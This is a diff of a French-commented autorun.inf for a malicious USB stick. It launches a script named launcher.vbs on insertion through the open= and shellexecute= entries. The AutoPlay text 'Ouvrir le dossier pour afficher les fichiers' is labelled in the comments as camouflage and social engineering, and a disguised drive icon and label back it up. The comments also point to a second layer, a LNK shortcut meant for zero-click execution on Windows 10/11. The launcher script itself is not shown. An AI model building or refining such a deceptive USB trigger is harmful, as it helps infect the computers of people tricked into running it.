@@ -1,14 +1,24 @@
 ; ============================================================
-; autorun.inf – Déclencheur AutoRun pour clé USB (Partie 1)
-; Fonctionne sur les systèmes Windows où AutoRun est activé
-; (Windows XP/7 par défaut, ou Windows 10/11 avec GPO)
+; autorun.inf – Déclencheur AutoPlay/AutoRun pour clé USB
+;
+; Windows XP/7 : « open= » déclenche launcher.vbs sans clic.
+; Windows 10/11 : « open= » est ignoré (politique AutoRun
+;   désactivée depuis KB971029). C'est « shellexecute= » qui
+;   alimente le menu AutoPlay ; l'utilisateur doit cliquer sur
+;   la notification toast puis sur l'action ci-dessous.
+;   Pour un déclenchement sans clic sur Windows 10/11, utiliser
+;   le raccourci LNK créé par prepare_usb.ps1 (couche 2).
 ; ============================================================
 [autorun]
-; Lance le script VBS de façon silencieuse dès l'insertion
+; Exécution automatique (Windows XP/7 uniquement)
 open=launcher.vbs
+; Action proposée dans le menu AutoPlay de Windows 10/11
 shellexecute=launcher.vbs
-; Commande affichée dans le menu AutoPlay (camouflage)
+; Texte affiché dans la notification AutoPlay (ingénierie sociale)
 action=Ouvrir le dossier pour afficher les fichiers
-; Icône du lecteur dans l'Explorateur (icône système standard)
+; Icône du lecteur dans l'Explorateur (icône disque dur standard)
 icon=shell32.dll,8
 label=USB Stockage
+; Force l'affichage du menu AutoPlay même si une action par défaut
+; est configurée (Windows Vista+)
+UseAutoPlay=1
